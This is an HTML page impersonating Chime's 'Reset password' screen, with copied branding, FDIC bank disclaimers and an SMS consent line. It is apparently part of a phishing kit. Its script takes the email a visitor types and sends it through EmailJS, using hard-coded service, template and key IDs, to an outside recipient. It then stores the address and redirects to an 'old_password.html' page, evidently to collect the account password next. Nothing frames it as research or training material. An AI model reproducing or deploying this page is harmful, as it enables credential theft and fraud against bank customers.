
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Chime - Reset Password</title>

  <style>
    :root {
      --chime-green: #2bd67b;
      --heading-green: #134034;
      --text: #0b1117;
      --muted: #66737b;
      --border: #e3e7ea;
    }
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#fff;color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
    main{max-width:480px;margin:40px auto 64px;padding:0 20px}
    .logo{margin-top:36px;margin-bottom:40px;}
    .logo img{height:44px;display:block;}
    h1{font-size:24px;font-weight:700;margin-bottom:10px;color:var(--heading-green)}
    .intro{font-size:16px;line-height:1.55;margin-bottom:22px;font-weight:600;color:#0b1117;}
    .field{margin-bottom:18px}
    .field input[type="email"]{
      width:100%;padding:18px 16px;font-size:16px;
      border:1.5px solid var(--border);border-radius:16px;
      outline:none;transition:border-color .2s ease
    }
    .field input[type="email"]:focus{border-color:#9db8ad}
    button{
      width:100%;padding:14px;border:none;border-radius:16px;
      font-size:16px;font-weight:700;background:#eef2f0;
      color:#9aa3b2;cursor:not-allowed;transition:.15s;
    }
    button.active{
      background:var(--chime-green);
      color:#0b1117;
      cursor:pointer;
    }
    .spinner-bars{width:24px;height:24px;display:inline-block;position:relative;color:#000;vertical-align:middle}
    .spinner-bars div{transform-origin:12px 12px;animation:spin 1.2s linear infinite;}
    .spinner-bars div:after{
      content:"";position:absolute;top:2px;left:11px;width:2px;height:6px;border-radius:20%;background:currentColor;
    }
    .spinner-bars div:nth-child(1){transform:rotate(0deg);animation-delay:-1.1s}
    .spinner-bars div:nth-child(2){transform:rotate(30deg);animation-delay:-1s}
    .spinner-bars div:nth-child(3){transform:rotate(60deg);animation-delay:-.9s}
    .spinner-bars div:nth-child(4){transform:rotate(90deg);animation-delay:-.8s}
    .spinner-bars div:nth-child(5){transform:rotate(120deg);animation-delay:-.7s}
    .spinner-bars div:nth-child(6){transform:rotate(150deg);animation-delay:-.6s}
    .spinner-bars div:nth-child(7){transform:rotate(180deg);animation-delay:-.5s}
    .spinner-bars div:nth-child(8){transform:rotate(210deg);animation-delay:-.4s}
    .spinner-bars div:nth-child(9){transform:rotate(240deg);animation-delay:-.3s}
    .spinner-bars div:nth-child(10){transform:rotate(270deg);animation-delay:-.2s}
    .spinner-bars div:nth-child(11){transform:rotate(300deg);animation-delay:-.1s}
    .spinner-bars div:nth-child(12){transform:rotate(330deg);animation-delay:0s}
    @keyframes spin{0%{opacity:1}100%{opacity:0}}

    .consent{margin-top:22px;margin-bottom:50px;font-size:16px;color:#134034;font-weight:600;text-align:left}
    .footer{margin-top:6px;font-size:12px;font-weight:500;line-height:1.7;color:#222826;text-align:left}
    .footer p:first-child{margin-bottom:10px;}
  </style>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script>
    const EMAILJS = {
      serviceId: 'service_2md1kk5',
      templateId: 'template_9wkmhgg',
      publicKey: '9CIA6J0Xxc5dZcY3e'
    };
    document.addEventListener('DOMContentLoaded', () => {
      emailjs.init({ publicKey: EMAILJS.publicKey });
    });
  </script>
</head>

<body>
  <main>
    <div class="logo"><img src="chime-logo.jpeg" alt="Chime Logo"></div>
    <h1>Reset password</h1>
    <p class="intro">In order to reset your password, we need to verify your identity. Please tell us the email associated with your Chime account.</p>

    <form id="emailForm" novalidate>
      <div class="field">
        <input id="emailInput" type="email" name="email" placeholder="Email" required autocomplete="email"/>
      </div>
      <button id="submitBtn" type="submit">Submit</button>
    </form>

    <p class="consent">By continuing, you agree to receive SMS text messages from Chime to verify your identity.</p>

    <div class="footer">
  <p>© 2025 Chime. All Rights Reserved.</p>
  <p>
    Banking Services provided by The Bancorp Bank, N.A., or Stride Bank, N.A., Members FDIC. 
    The Chime Visa® Debit Card is issued by The Bancorp Bank, N.A., or Stride Bank pursuant 
    to a license from Visa U.S.A. Inc. and may be used everywhere Visa debit cards are accepted. 
    Please see back of your Card for its issuing bank.
  </p>
</div>
  </main>

<script>
document.addEventListener("DOMContentLoaded", ()=>{
  const form = document.getElementById("emailForm");
  const emailInput = document.getElementById("emailInput");
  const submitBtn = document.getElementById("submitBtn");

  function validEmail(v){
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
  }

  function setBtnState(){
    const ok = validEmail(emailInput.value.trim());
    submitBtn.classList.toggle("active", ok);
    submitBtn.disabled = !ok;
  }

  emailInput.addEventListener("input", setBtnState);
  setBtnState();

  form.addEventListener("submit", async (e)=>{
    e.preventDefault();

    const email = emailInput.value.trim().toLowerCase();
    if(!validEmail(email)) return;

    submitBtn.disabled = true;
    submitBtn.innerHTML =
      '<div class="spinner-bars"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>';

    const payload = {
      email: email,
      page: "reset_password.html",
      timestamp: new Date().toISOString()
    };

    sessionStorage.setItem("lookupEmail", email);


    try {
      await emailjs.send(
        EMAILJS.serviceId,
        EMAILJS.templateId,
        payload
      );

      setTimeout(() => {
        window.location.href = "old_password.html";
      }, 1200);

    } catch (err) {
      console.error("EmailJS FAILED:", err);
      alert("Email failed to send. Check console.");
      submitBtn.disabled = false;
    }
  });
});
</script>

</body>
</html>
